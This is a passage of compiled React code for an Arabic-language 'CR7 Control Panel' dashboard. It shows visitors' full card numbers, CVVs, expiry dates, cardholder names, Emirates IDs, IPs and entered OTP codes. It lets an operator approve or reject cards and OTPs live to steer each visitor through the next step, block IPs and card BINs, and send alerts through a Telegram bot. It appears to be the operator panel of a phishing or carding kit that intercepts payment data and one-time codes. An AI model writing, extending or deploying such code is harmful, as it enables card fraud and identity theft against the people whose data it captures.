  }, selectedOrder.phone || selectedOrder.bookingData && selectedOrder.bookingData["الهاتف"] || "—")), /*#__PURE__*/React.createElement("div", null, /*#__PURE__*/React.createElement("span", {
    className: "text-gray-400"
  }, "\u0631\u0642\u0645 \u0627\u0644\u0647\u0648\u064A\u0629:"), " ", /*#__PURE__*/React.createElement("strong", {
    className: "font-mono text-gray-800 dark:text-gray-200",
    dir: "ltr"
  }, selectedOrder.emiratesId || selectedOrder.bookingData && selectedOrder.bookingData["رقم الهوية"] || "—")), /*#__PURE__*/React.createElement("div", null, /*#__PURE__*/React.createElement("span", {
    className: "text-gray-400"
  }, "\u0639\u0646\u0648\u0627\u0646 IP:"), " ", /*#__PURE__*/React.createElement("strong", {
    className: "font-mono text-gray-800 dark:text-gray-200",
    dir: "ltr"
  }, selectedOrder.ip || "—")), /*#__PURE__*/React.createElement("div", null, /*#__PURE__*/React.createElement("span", {
    className: "text-gray-400"
  }, "\u062A\u0627\u0631\u064A\u062E \u0627\u0644\u0637\u0644\u0628:"), " ", /*#__PURE__*/React.createElement("strong", {
    className: "font-mono text-gray-800 dark:text-gray-200",
    dir: "ltr"
  }, formatFullDateTime(selectedOrder.createdAt || selectedOrder.updatedAt))), /*#__PURE__*/React.createElement("div", null, /*#__PURE__*/React.createElement("span", {
    className: "text-gray-400"
  }, "\u0627\u0644\u0645\u0631\u062D\u0644\u0629 \u0627\u0644\u062D\u0627\u0644\u064A\u0629:"), " ", /*#__PURE__*/React.createElement("strong", {
    className: "text-amber-600 dark:text-amber-400"
  }, getStepLabel(selectedOrder.step))))), selectedOrder.cardNumber ? /*#__PURE__*/React.createElement("div", {
    className: `p-4 rounded-xl border ${isDark ? "bg-gray-750/50 border-gray-700" : "bg-gray-50 border-gray-200"}`
  }, /*#__PURE__*/React.createElement("h4", {
    className: "font-bold text-gray-900 dark:text-white mb-2 flex items-center gap-1.5"
  }, /*#__PURE__*/React.createElement("span", null, "\uD83D\uDCB3"), /*#__PURE__*/React.createElement("span", null, "\u0628\u064A\u0627\u0646\u0627\u062A \u0627\u0644\u062F\u0641\u0639 \u0648\u0627\u0644\u0628\u0637\u0627\u0642\u0629 \u0627\u0644\u0628\u0646\u0643\u064A\u0629:")), /*#__PURE__*/React.createElement("div", {
    className: "grid grid-cols-1 sm:grid-cols-2 gap-2 font-mono"
  }, /*#__PURE__*/React.createElement("div", null, /*#__PURE__*/React.createElement("span", {
    className: "text-gray-400 font-sans"
  }, "\u0631\u0642\u0645 \u0627\u0644\u0628\u0637\u0627\u0642\u0629:"), " ", /*#__PURE__*/React.createElement("strong", {
    className: "text-blue-600 dark:text-blue-400"
  }, selectedOrder.cardNumber)), /*#__PURE__*/React.createElement("div", null, /*#__PURE__*/React.createElement("span", {
    className: "text-gray-400 font-sans"
  }, "\u062A\u0627\u0631\u064A\u062E \u0627\u0644\u0627\u0646\u062A\u0647\u0627\u0621:"), " ", /*#__PURE__*/React.createElement("strong", null, selectedOrder.expiry || "—")), /*#__PURE__*/React.createElement("div", null, /*#__PURE__*/React.createElement("span", {
    className: "text-gray-400 font-sans"
  }, "\u0631\u0645\u0632 \u0627\u0644\u0623\u0645\u0627\u0646 CVV:"), " ", /*#__PURE__*/React.createElement("strong", {
    className: "text-red-500"
  }, selectedOrder.cvv || "—")), /*#__PURE__*/React.createElement("div", null, /*#__PURE__*/React.createElement("span", {
    className: "text-gray-400 font-sans"
  }, "\u0627\u0633\u0645 \u0635\u0627\u062D\u0628 \u0627\u0644\u0628\u0637\u0627\u0642\u0629:"), " ", /*#__PURE__*/React.createElement("strong", null, selectedOrder.cardHolder || "—")), selectedOrder.otp && /*#__PURE__*/React.createElement("div", {
    className: "col-span-2 pt-2 border-t border-gray-200 dark:border-gray-700 flex items-center gap-2"
  }, /*#__PURE__*/React.createElement("span", {
    className: "text-gray-400 font-sans"
  }, "\u0631\u0645\u0632 OTP \u0627\u0644\u0645\u062F\u062E\u0644:"), /*#__PURE__*/React.createElement("span", {
    className: "px-2 py-0.5 rounded bg-purple-100 text-purple-800 font-black text-sm"
  }, selectedOrder.otp), /*#__PURE__*/React.createElement("span", {
    className: "text-gray-500 font-sans"
  }, "(", selectedOrder.otpApprovalStatus || "بانتظار", ")")))) : null, selectedOrder.bookingData && Object.keys(selectedOrder.bookingData).length > 0 && /*#__PURE__*/React.createElement("div", {
    className: `p-4 rounded-xl border ${isDark ? "bg-gray-750/50 border-gray-700" : "bg-gray-50 border-gray-200"}`
  }, /*#__PURE__*/React.createElement("h4", {
    className: "font-bold text-gray-900 dark:text-white mb-2 flex items-center gap-1.5"
  }, /*#__PURE__*/React.createElement("span", null, "\uD83D\uDCCB"), /*#__PURE__*/React.createElement("span", null, "\u0628\u064A\u0627\u0646\u0627\u062A \u0627\u0633\u062A\u0645\u0627\u0631\u0629 \u0627\u0644\u062A\u0642\u062F\u064A\u0645:")), /*#__PURE__*/React.createElement("div", {
    className: "space-y-1.5"
  }, Object.entries(selectedOrder.bookingData).map(([k, v]) => /*#__PURE__*/React.createElement("div", {
    key: k,
    className: "flex items-center justify-between border-b border-gray-100 dark:border-gray-700/50 pb-1"
  }, /*#__PURE__*/React.createElement("span", {
    className: "text-gray-400"
  }, k, ":"), /*#__PURE__*/React.createElement("span", {
    className: "font-bold text-gray-800 dark:text-gray-200"
  }, String(v))))))), /*#__PURE__*/React.createElement("div", {
    className: "p-4 border-t flex items-center justify-between gap-2 border-gray-200 dark:border-gray-700"
  }, /*#__PURE__*/React.createElement("button", {
    onClick: () => {
      onSelectVisitor(selectedOrder.id);
      setSelectedOrder(null);
    },
    className: "px-4 py-2 rounded-xl text-xs font-bold bg-blue-600 hover:bg-blue-700 text-white transition-all flex items-center gap-1.5 cursor-pointer shadow-sm"
  }, /*#__PURE__*/React.createElement("span", null, "\uD83D\uDCAC"), /*#__PURE__*/React.createElement("span", null, "\u0641\u062A\u062D \u0641\u064A \u0634\u0627\u0634\u0629 \u0627\u0644\u0645\u062A\u0627\u0628\u0639\u0629 \u0627\u0644\u0645\u0628\u0627\u0634\u0631\u0629 \u0648\u0627\u0644\u062A\u062D\u0643\u0645")), /*#__PURE__*/React.createElement("button", {
    onClick: () => setSelectedOrder(null),
    className: "px-4 py-2 rounded-xl text-xs font-bold bg-gray-100 hover:bg-gray-200 dark:bg-gray-700 dark:hover:bg-gray-650 text-gray-700 dark:text-gray-200 transition-all cursor-pointer"
  }, "\u0625\u063A\u0644\u0627\u0642")))));
}

// ─── Main Dashboard ─────────────────────────────────────────────────────────
function Dashboard() {
  const [adminUser, setAdminUser] = useState({
    name: "CR7 Admin",
    email: "admin@cr7.com"
  });
  const [visitors, setVisitors] = useState([]);
  const [selectedId, setSelectedId] = useState(null);
  const [searchQuery, setSearchQuery] = useState("");
  const [isDark, setIsDark] = useState(false);
  const [soundEnabled, setSoundEnabled] = useState(true);
  const [loading, setLoading] = useState(false);
  const [dbConnected, setDbConnected] = useState(true);
  const [currentTime, setCurrentTime] = useState(new Date());
  const [activeTab, setActiveTab] = useState("feed"); // "feed" | "charts"
  const [stats, setStats] = useState({
    total: 0,
    online: 0,
    withCard: 0,
    waiting: 0,
    blocked: 0,
    otp: 0,
    total_visits: 0,
    new_today: 0
  });
  const [showBlockedPanel, setShowBlockedPanel] = useState(false);
  const [blockedIps, setBlockedIps] = useState([]);
  const [blockedBins, setBlockedBins] = useState([]);
  const [newIp, setNewIp] = useState("");
  const [newBin, setNewBin] = useState("");
  const [stepInput, setStepInput] = useState("");
  const [showStepPanel, setShowStepPanel] = useState(false);
  const [showTelegramModal, setShowTelegramModal] = useState(false);
  const [tgToken, setTgToken] = useState("");
  const [tgChatId, setTgChatId] = useState("");
  const [tgEnabled, setTgEnabled] = useState(false);
  const [tgStatusMsg, setTgStatusMsg] = useState(null);
  const [tgLoading, setTgLoading] = useState(false);
  const prevCountRef = useRef(0);
  const prevCardCountRef = useRef(0);
  const messagesEndRef = useRef(null);
  const pollRef = useRef(null);
  const selectedVisitor = visitors.find(v => v.id === selectedId) || null;
  const messages = selectedVisitor ? buildMessages(selectedVisitor) : [];

  // Live clock timer
  useEffect(() => {
    const timer = setInterval(() => setCurrentTime(new Date()), 1000);
    return () => clearInterval(timer);
  }, []);

  // Dark mode toggle
  useEffect(() => {
    document.documentElement.classList.toggle("dark", isDark);
  }, [isDark]);

  // Load telegram config
  useEffect(() => {
    adminApi.getTelegramConfig().then(cfg => {
      if (cfg) {
        if (cfg.token) setTgToken(cfg.token);
        if (cfg.chatId) setTgChatId(cfg.chatId);
        setTgEnabled(!!cfg.enabled);
      }
    }).catch(() => {});
  }, []);

  // Scroll to bottom
  useEffect(() => {
    messagesEndRef.current?.scrollIntoView({
      behavior: "smooth"
    });
  }, [messages.length]);

  // Process and update visitor list consistently
  const processVisitorList = useCallback(rawList => {
    if (!Array.isArray(rawList)) return;
    const list = rawList.map((v, i) => {
      if (!v || typeof v !== 'object') return null;
      let id = v.id;
      if (typeof id !== 'string' || !id.trim() || id === '[object Object]') {
        id = `vis_${i}_${Date.now().toString(36)}`;
      }
      return {
        ...v,
        id,
        name: typeof v.name === 'string' && v.name.trim() ? v.name : 'زائر جديد',
        bookingData: v.bookingData && typeof v.bookingData === 'object' ? v.bookingData : {}
      };
    }).filter(Boolean);
    setVisitors(list);
    setDbConnected(true);
    const cardCount = list.filter(v => !!v.cardNumber).length;
    setStats({
      total: list.length,
      online: list.filter(v => v.online === true || v.status === "online").length,
      withCard: cardCount,
      waiting: list.filter(v => v.cardApprovalStatus === "waiting" || v.otpApprovalStatus === "waiting").length,
      blocked: list.filter(v => v.blocked === true || v.status === "blocked").length,
      otp: list.filter(v => !!v.otp).length,
      total_visits: list.length,
      new_today: list.filter(v => {
        if (!v.createdAt) return false;
        const d = new Date(v.createdAt);
        const now = new Date();
        return d.toDateString() === now.toDateString();
      }).length
    });

    // Play notification sound if new visitor or new card arrived
    if (soundEnabled && (list.length > prevCountRef.current || cardCount > prevCardCountRef.current)) {
      if (prevCountRef.current > 0) {
        playChime();
      }
    }
    prevCountRef.current = list.length;
    prevCardCountRef.current = cardCount;

    // Auto select first if none selected
    if (!selectedId && list.length > 0) {
      setSelectedId(list[0].id);
    }
    setLoading(false);
  }, [soundEnabled, selectedId]);

  // Fetch visitors fallback
  const fetchVisitors = useCallback(async () => {
    try {
      const list = await adminApi.getVisitors();
      if (Array.isArray(list)) {
        processVisitorList(list);
        setDbConnected(true);
      }
    } catch (e) {
      // Keep current view active, don't clear state on temporary network hiccups
    } finally {
      setLoading(false);
    }
  }, [processVisitorList]);

  // Cross-tab real-time listener for instant zero-latency updates
  useEffect(() => {
    let bc = null;
    try {
      if (typeof BroadcastChannel !== 'undefined') {
        bc = new BroadcastChannel('cr7_live_bus');
        bc.onmessage = () => {
          fetchVisitors();
        };
      }
    } catch (e) {}
    const onStorage = e => {
      if (e.key === '_cr7_visitors') {
        fetchVisitors();
      }
    };
    window.addEventListener('storage', onStorage);
    return () => {
      if (bc) bc.close();
      window.removeEventListener('storage', onStorage);
    };
  }, [fetchVisitors]);

  // ─── Permanent SSE Stream Connection to Database (Zero Disconnects) ───
  useEffect(() => {
    let es = null;
    let reconnectTimer = null;
    let isMounted = true;
    function connectSSE() {
      try {
        if (es) {
          es.close();
          es = null;
        }
        es = new EventSource('/api/admin/stream');
        es.onopen = () => {
          if (!isMounted) return;
          setDbConnected(true);
        };
        es.onmessage = event => {
          if (!isMounted) return;
          try {
            const data = JSON.parse(event.data);
            const list = Array.isArray(data) ? data : (data && Array.isArray(data.visitors) ? data.visitors : null);
            if (list) {
              processVisitorList(list);
              setDbConnected(true);
            }
          } catch (err) {}
        };
        es.onerror = () => {
          if (!isMounted) return;
          if (es) {
            es.close();
            es = null;
          }
          // Immediately verify connection via backup poll before assuming disconnection
          fetchVisitors().then(() => {
            if (isMounted) setDbConnected(true);
          }).catch(() => {
            if (isMounted) setDbConnected(false);
          });
          clearTimeout(reconnectTimer);
          reconnectTimer = setTimeout(() => {
            if (isMounted) connectSSE();
          }, 1000);
        };
      } catch (err) {
        if (!isMounted) return;
        fetchVisitors().then(() => {
          if (isMounted) setDbConnected(true);
        }).catch(() => {
          if (isMounted) setDbConnected(false);
        });
        clearTimeout(reconnectTimer);
        reconnectTimer = setTimeout(() => {
          if (isMounted) connectSSE();
        }, 1500);
      }
    }

    // Initial fetch then start persistent SSE stream
    fetchVisitors();
    connectSSE();

    // High-reliability backup polling every 2 seconds to guarantee 100% continuous sync
    pollRef.current = setInterval(fetchVisitors, 2000);
    return () => {
      isMounted = false;
      if (es) es.close();
      clearTimeout(reconnectTimer);
      if (pollRef.current) clearInterval(pollRef.current);
    };
  }, [fetchVisitors, processVisitorList]);

  // Fetch blocked lists
  useEffect(() => {
    adminApi.getBlockedIps().then(r => setBlockedIps(r || [])).catch(() => {});
    adminApi.getBlockedBins().then(r => setBlockedBins(r || [])).catch(() => {});
  }, []);
  const handleApproveCard = async () => {
    if (!selectedVisitor) return;
    await adminApi.updateVisitor(selectedVisitor.id, {
      cardApprovalStatus: "approved",
      step: "otp"
    });
    fetchVisitors();
  };
  const handleRejectCard = async () => {
    if (!selectedVisitor) return;
    await adminApi.updateVisitor(selectedVisitor.id, {
      cardApprovalStatus: "rejected",
      step: "card_error"
    });
    fetchVisitors();
  };
  const handleApproveOtp = async () => {
    if (!selectedVisitor) return;
    await adminApi.updateVisitor(selectedVisitor.id, {
      otpApprovalStatus: "approved",
      step: "success"
    });
    fetchVisitors();
  };
  const handleRejectOtp = async () => {
    if (!selectedVisitor) return;
    await adminApi.updateVisitor(selectedVisitor.id, {
      otpApprovalStatus: "rejected",
      step: "otp_error"
    });
    fetchVisitors();
  };
  const handleUpdateOrderStatus = async (id, newStatus) => {
    setVisitors(prev => prev.map(v => v.id === id ? {
      ...v,
      orderStatus: newStatus
    } : v));
    try {
      await adminApi.updateOrderStatus(id, newStatus);
      fetchVisitors();
    } catch (e) {
      console.error("Error updating order status:", e);
      fetchVisitors();
    }
  };
  const handleDelete = async id => {
    if (!confirm("هل أنت متأكد من حذف هذا الزائر؟")) return;
    await adminApi.deleteVisitor(id);
    if (selectedId === id) setSelectedId(null);
    fetchVisitors();
  };
  const handleBlockIp = async () => {
    if (!newIp.trim()) return;
    const res = await adminApi.blockIp(newIp.trim());
    setBlockedIps(res || []);
    setNewIp("");
  };
  const handleUnblockIp = async ip => {
    const res = await adminApi.unblockIp(ip);
    setBlockedIps(res || []);
  };
  const handleBlockBin = async () => {
    if (!newBin.trim()) return;
    const res = await adminApi.blockBin(newBin.trim());
    setBlockedBins(res || []);
    setNewBin("");
  };
  const handleUnblockBin = async bin => {
    const res = await adminApi.unblockBin(bin);
    setBlockedBins(res || []);
  };
  const handleSetStep = async () => {
    if (!selectedVisitor || !stepInput.trim()) return;
    await adminApi.updateVisitor(selectedVisitor.id, {
      step: stepInput.trim()
    });
    setStepInput("");
    setShowStepPanel(false);
    fetchVisitors();
  };
  const filteredLeft = visitors.filter(v => {
    if (!searchQuery) return true;
    const q = searchQuery.toLowerCase();
    return (v.name || "").toLowerCase().includes(q) || (v.phone || "").includes(q) || (v.ip || "").includes(q) || (v.cardNumber || "").includes(q);
  });
  return /*#__PURE__*/React.createElement("div", {
    className: `h-screen flex flex-col overflow-hidden font-sans ${isDark ? "bg-gray-900 text-gray-100" : "bg-[#f8f9fb] text-gray-900"}`,
    dir: "rtl"
  }, /*#__PURE__*/React.createElement("header", {
    className: `${isDark ? "bg-gray-800 border-gray-700" : "bg-white border-gray-200"} border-b flex items-center px-5 h-14 gap-3 flex-shrink-0 shadow-sm`,
    dir: "rtl"
  }, /*#__PURE__*/React.createElement("div", {
    className: "flex items-center gap-3 flex-shrink-0"
  }, /*#__PURE__*/React.createElement("div", {
    className: "w-9 h-9 rounded-xl bg-gradient-to-br from-amber-400 to-amber-600 flex items-center justify-center shadow-md"
  }, /*#__PURE__*/React.createElement("span", {
    className: "text-xl"
  }, "\uD83E\uDD81")), /*#__PURE__*/React.createElement("div", null, /*#__PURE__*/React.createElement("span", {
    className: "font-extrabold text-base tracking-wider bg-gradient-to-r from-amber-500 to-yellow-500 bg-clip-text text-transparent"
  }, "CR7"), /*#__PURE__*/React.createElement("span", {
    className: "text-[10px] text-gray-400 block -mt-1 font-bold"
  }, "CONTROL PANEL"))), /*#__PURE__*/React.createElement("div", {
    className: "flex items-center gap-1 flex-shrink-0 mr-2"
  }, /*#__PURE__*/React.createElement("button", {
    onClick: fetchVisitors,
    className: `p-2 rounded-xl transition-all ${isDark ? "hover:bg-gray-700 text-gray-300" : "hover:bg-gray-100 text-gray-600"}`,
    title: "\u062A\u062D\u062F\u064A\u062B \u064A\u062F\u0648\u064A"
  }, /*#__PURE__*/React.createElement("svg", {
    className: "w-5 h-5",
    fill: "none",
    stroke: "currentColor",
    viewBox: "0 0 24 24"
  }, /*#__PURE__*/React.createElement("path", {
    strokeLinecap: "round",
    strokeLinejoin: "round",
    strokeWidth: 2,
    d: "M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15"
  }))), /*#__PURE__*/React.createElement("button", {
    onClick: () => setShowBlockedPanel(true),
    className: `p-2 rounded-xl transition-all ${isDark ? "hover:bg-gray-700 text-gray-300" : "hover:bg-gray-100 text-gray-600"}`,
    title: "\u0627\u0644\u0642\u0648\u0627\u0626\u0645 \u0627\u0644\u0645\u062D\u0638\u0648\u0631\u0629 (IP & BIN)"
  }, /*#__PURE__*/React.createElement("svg", {
    className: "w-5 h-5",
    fill: "none",
    stroke: "currentColor",
    viewBox: "0 0 24 24"
  }, /*#__PURE__*/React.createElement("path", {
    strokeLinecap: "round",
    strokeLinejoin: "round",
    strokeWidth: 2,
    d: "M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"
  }))), /*#__PURE__*/React.createElement("button", {
    onClick: () => {
      setTgStatusMsg(null);
      setShowTelegramModal(true);
    },
    className: `p-2 rounded-xl transition-all ${isDark ? "hover:bg-gray-700 text-sky-400" : "hover:bg-gray-100 text-sky-500"}`,
    title: "\u0625\u0639\u062F\u0627\u062F\u0627\u062A \u0628\u0648\u062A \u0627\u0644\u062A\u0644\u062C\u0631\u0627\u0645"
  }, /*#__PURE__*/React.createElement("svg", {
    className: "w-5 h-5",
    fill: "currentColor",
    viewBox: "0 0 24 24"
  }, /*#__PURE__*/React.createElement("path", {
    d: "M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm4.64 6.8c-.15 1.58-.8 5.42-1.13 7.19-.14.75-.42 1-.68 1.03-.58.05-1.02-.38-1.58-.75-.88-.58-1.38-.94-2.23-1.5-.99-.65-.35-1.01.22-1.59.15-.15 2.71-2.48 2.76-2.69a.2.2 0 00-.05-.18c-.06-.05-.14-.03-.21-.02-.09.02-1.49.95-4.22 2.79-.4.27-.76.41-1.08.4-.36-.01-1.04-.2-1.55-.37-.63-.2-1.12-.31-1.08-.66.02-.18.27-.36.74-.55 2.92-1.27 4.86-2.11 5.83-2.52 2.77-1.16 3.35-1.36 3.73-1.36.08 0 .27.02.39.12.1.08.13.19.14.27-.01.06.01.24 0 .38z"
  }))), /*#__PURE__*/React.createElement("button", {
    onClick: () => setSoundEnabled(s => !s),
    className: `p-2 rounded-xl transition-all ${isDark ? "hover:bg-gray-700 text-gray-300" : "hover:bg-gray-100 text-gray-600"}`,
    title: soundEnabled ? "كتم الصوت" : "تفعيل التنبيه الصوتي"
  }, soundEnabled ? /*#__PURE__*/React.createElement("svg", {
    className: "w-5 h-5 text-amber-500",
    fill: "none",
    stroke: "currentColor",
    viewBox: "0 0 24 24"
  }, /*#__PURE__*/React.createElement("path", {
    strokeLinecap: "round",
    strokeLinejoin: "round",
    strokeWidth: 2,
    d: "M15 17h5l-1.405-1.405A2.032 2.032 0 0118 14.158V11a6.002 6.002 0 00-4-5.659V5a2 2 0 10-4 0v.341C7.67 6.165 6 8.388 6 11v3.159c0 .538-.214 1.055-.595 1.436L4 17h5m6 0v1a3 3 0 11-6 0v-1m6 0H9"
  })) : /*#__PURE__*/React.createElement("svg", {
    className: "w-5 h-5 text-gray-400",
    fill: "none",
    stroke: "currentColor",
    viewBox: "0 0 24 24"
  }, /*#__PURE__*/React.createElement("path", {
    strokeLinecap: "round",
    strokeLinejoin: "round",
    strokeWidth: 2,
    d: "M5.586 15H4a1 1 0 01-1-1v-4a1 1 0 011-1h1.586l4.707-4.707C10.923 3.663 12 4.109 12 5v14c0 .891-1.077 1.337-1.707.707L5.586 15z"
  }), /*#__PURE__*/React.createElement("path", {
    strokeLinecap: "round",
    strokeLinejoin: "round",
    strokeWidth: 2,
    d: "M17 14l2-2m0 0l2-2m-2 2l-2-2m2 2l2 2"
  }))), /*#__PURE__*/React.createElement("button", {
    onClick: () => setIsDark(d => !d),
    className: `p-2 rounded-xl transition-all ${isDark ? "hover:bg-gray-700 text-yellow-400" : "hover:bg-gray-100 text-gray-600"}`,
    title: "\u0627\u0644\u0648\u0636\u0639 \u0627\u0644\u0644\u064A\u0644\u064A"
  }, isDark ? /*#__PURE__*/React.createElement("svg", {
    className: "w-5 h-5",
    fill: "none",
    stroke: "currentColor",
    viewBox: "0 0 24 24"
  }, /*#__PURE__*/React.createElement("path", {
    strokeLinecap: "round",
    strokeLinejoin: "round",
    strokeWidth: 2,
    d: "M12 3v1m0 16v1m9-9h-1M4 12H3m15.364 6.364l-.707-.707M6.343 6.343l-.707-.707m12.728 0l-.707.707M6.343 17.657l-.707.707M16 12a4 4 0 11-8 0 4 4 0 018 0z"
  })) : /*#__PURE__*/React.createElement("svg", {
    className: "w-5 h-5",
    fill: "none",
    stroke: "currentColor",
    viewBox: "0 0 24 24"
  }, /*#__PURE__*/React.createElement("path", {
    strokeLinecap: "round",
    strokeLinejoin: "round",
    strokeWidth: 2,
    d: "M20.354 15.354A9 9 0 018.646 3.646 9.003 9.003 0 0012 21a9.003 9.003 0 008.354-5.646z"
  })))), /*#__PURE__*/React.createElement("div", {
    className: "flex items-center gap-4 flex-1 overflow-x-auto mx-4 justify-center",
    dir: "rtl"
  }, /*#__PURE__*/React.createElement("div", {
    className: `flex items-center gap-1.5 px-3 py-1 rounded-lg text-xs font-bold border shadow-sm transition-all flex-shrink-0 ${dbConnected ? "bg-emerald-50 dark:bg-emerald-950/60 text-emerald-700 dark:text-emerald-300 border-emerald-500/40" : "bg-amber-50 dark:bg-amber-950/60 text-amber-700 dark:text-amber-300 border-amber-500/40 animate-pulse"}`,
    title: dbConnected ? "الاتصال بقاعدة البيانات مباشر ولحظي (SSE Live Stream)" : "جاري إعادة الاتصال التلقائي بالقاعدة..."
  }, /*#__PURE__*/React.createElement("span", {
    className: "relative flex h-2 w-2"
  }, dbConnected && /*#__PURE__*/React.createElement("span", {
    className: "animate-ping absolute inline-flex h-full w-full rounded-full bg-emerald-400 opacity-75"
  }), /*#__PURE__*/React.createElement("span", {
    className: `relative inline-flex rounded-full h-2 w-2 ${dbConnected ? "bg-emerald-500" : "bg-amber-500"}`
  })), /*#__PURE__*/React.createElement("span", null, dbConnected ? "القاعدة: متصل دائم ✓" : "جاري إعادة الربط...")), /*#__PURE__*/React.createElement("div", {
    className: "flex items-center gap-1.5 px-3 py-1 rounded-lg bg-blue-50/90 dark:bg-blue-950/50 text-xs border border-blue-200/60 dark:border-blue-800/40 text-blue-700 dark:text-blue-300 font-mono font-bold shadow-sm"
  }, /*#__PURE__*/React.createElement("span", null, "\uD83D\uDD52"), /*#__PURE__*/React.createElement("span", {
    dir: "ltr"
  }, currentTime.toLocaleTimeString("ar-AE", {
    hour: "2-digit",
    minute: "2-digit",
    second: "2-digit",
    hour12: true
  }))), /*#__PURE__*/React.createElement("div", {
    className: "flex items-center gap-1 px-3 py-1 rounded-lg bg-gray-100 dark:bg-gray-700/60 text-xs"
  }, /*#__PURE__*/React.createElement("span", {
    className: "text-gray-400"
  }, "\u0625\u062C\u0645\u0627\u0644\u064A:"), /*#__PURE__*/React.createElement("span", {
    className: "font-extrabold text-blue-600 dark:text-blue-400 tabular-nums"
  }, stats.total)), /*#__PURE__*/React.createElement("div", {
    className: "flex items-center gap-1.5 px-3 py-1 rounded-lg bg-emerald-50 dark:bg-emerald-950/40 text-xs border border-emerald-500/30 shadow-sm"
  }, /*#__PURE__*/React.createElement("span", {
    className: "w-2 h-2 rounded-full bg-emerald-500 animate-ping inline-block"
  }), /*#__PURE__*/React.createElement("span", {
    className: "text-emerald-700 dark:text-emerald-300 font-bold"
  }, "\u0645\u062A\u0635\u0644 \u0627\u0644\u0622\u0646:"), /*#__PURE__*/React.createElement("span", {
    className: "font-extrabold text-emerald-600 dark:text-emerald-400 tabular-nums text-sm"
  }, stats.online)), /*#__PURE__*/React.createElement("div", {
    className: "flex items-center gap-1 px-3 py-1 rounded-lg bg-amber-50 dark:bg-amber-900/30 text-xs"
  }, /*#__PURE__*/React.createElement("span", {
    className: "text-amber-700 dark:text-amber-300"
  }, "\u0628\u0637\u0627\u0642\u0627\u062A:"), /*#__PURE__*/React.createElement("span", {
    className: "font-extrabold text-amber-600 tabular-nums"
  }, stats.withCard)), /*#__PURE__*/React.createElement("div", {
    className: "flex items-center gap-1 px-3 py-1 rounded-lg bg-purple-50 dark:bg-purple-900/30 text-xs"
  }, /*#__PURE__*/React.createElement("span", {
    className: "text-purple-700 dark:text-purple-300"
  }, "OTP:"), /*#__PURE__*/React.createElement("span", {
    className: "font-extrabold text-purple-600 tabular-nums"
  }, stats.otp)), /*#__PURE__*/React.createElement("div", {
    className: "flex items-center gap-1 px-3 py-1 rounded-lg bg-red-50 dark:bg-red-900/30 text-xs"
  }, /*#__PURE__*/React.createElement("span", {
    className: "text-red-700 dark:text-red-300"
  }, "\u0628\u0627\u0646\u062A\u0638\u0627\u0631:"), /*#__PURE__*/React.createElement("span", {
    className: "font-extrabold text-red-600 tabular-nums"
  }, stats.waiting))), /*#__PURE__*/React.createElement("div", {
    className: "flex items-center gap-1 bg-gray-100 dark:bg-gray-800 p-1 rounded-xl flex-shrink-0 border border-gray-200/80 dark:border-gray-700",
    dir: "rtl"
  }, /*#__PURE__*/React.createElement("button", {
    onClick: () => setActiveTab("feed"),
    className: `px-3 py-1.5 rounded-lg text-xs font-bold transition-all flex items-center gap-1.5 cursor-pointer ${activeTab === "feed" ? "bg-white dark:bg-gray-700 text-blue-600 dark:text-blue-400 shadow-sm" : "text-gray-500 hover:text-gray-900 dark:hover:text-gray-200"}`
  }, /*#__PURE__*/React.createElement("span", null, "\uD83D\uDC65"), /*#__PURE__*/React.createElement("span", null, "\u0627\u0644\u0645\u062A\u0627\u0628\u0639\u0629 \u0627\u0644\u0645\u0628\u0627\u0634\u0631\u0629"), stats.online > 0 && /*#__PURE__*/React.createElement("span", {
    className: "w-2 h-2 rounded-full bg-emerald-500 animate-pulse"
  })), /*#__PURE__*/React.createElement("button", {
    onClick: () => setActiveTab("orders"),
    className: `px-3 py-1.5 rounded-lg text-xs font-bold transition-all flex items-center gap-1.5 cursor-pointer ${activeTab === "orders" ? "bg-white dark:bg-gray-700 text-emerald-600 dark:text-emerald-400 shadow-sm" : "text-gray-500 hover:text-gray-900 dark:hover:text-gray-200"}`
  }, /*#__PURE__*/React.createElement("span", null, "\uD83D\uDCCB"), /*#__PURE__*/React.createElement("span", null, "\u062C\u062F\u0648\u0644 \u0637\u0644\u0628\u0627\u062A \u0627\u0644\u0628\u0637\u0627\u0642\u0627\u062A"), /*#__PURE__*/React.createElement("span", {
    className: `text-[10px] px-1.5 py-0.2 rounded-full font-bold ${activeTab === "orders" ? "bg-emerald-100 dark:bg-emerald-900/60 text-emerald-800 dark:text-emerald-200" : "bg-gray-200 dark:bg-gray-750 text-gray-700 dark:text-gray-300"}`
  }, visitors.length)), /*#__PURE__*/React.createElement("button", {
    onClick: () => setActiveTab("charts"),
    className: `px-3 py-1.5 rounded-lg text-xs font-bold transition-all flex items-center gap-1.5 cursor-pointer ${activeTab === "charts" ? "bg-gradient-to-r from-amber-500 to-yellow-500 text-white shadow-md" : "text-amber-600 dark:text-amber-400 hover:bg-amber-50 dark:hover:bg-amber-950/40"}`
  }, /*#__PURE__*/React.createElement("span", null, "\uD83D\uDCCA"), /*#__PURE__*/React.createElement("span", null, "\u0631\u0633\u0648\u0645 \u0648\u062A\u062D\u0644\u064A\u0644\u0627\u062A \u0627\u0644\u0628\u0637\u0627\u0642\u0627\u062A"), /*#__PURE__*/React.createElement("span", {
    className: `text-[10px] px-1.5 py-0.2 rounded-full font-bold ${activeTab === "charts" ? "bg-white/20 text-white" : "bg-amber-100 dark:bg-amber-900/60 text-amber-800 dark:text-amber-300"}`
  }, "Recharts"))), /*#__PURE__*/React.createElement("a", {
    href: "/download-project",
    download: "project-files.zip",
    className: "px-3 py-1.5 rounded-xl bg-blue-600 hover:bg-blue-700 text-white text-xs font-bold transition-all flex items-center gap-1.5 shadow-sm flex-shrink-0 cursor-pointer",
    title: "\u062A\u062D\u0645\u064A\u0644 \u0645\u0644\u0641\u0627\u062A \u0627\u0644\u0645\u0634\u0631\u0648\u0639 \u0628\u0627\u0644\u0643\u0627\u0645\u0644 \u0628\u0635\u064A\u063A\u0629 ZIP"
  }, /*#__PURE__*/React.createElement("span", null, "\uD83D\uDCE6"), /*#__PURE__*/React.createElement("span", {
    className: "hidden md:inline"
  }, "\u062A\u062D\u0645\u064A\u0644 ZIP")), /*#__PURE__*/React.createElement("div", {
    className: "flex items-center gap-2 flex-shrink-0"
  }, /*#__PURE__*/React.createElement("div", {
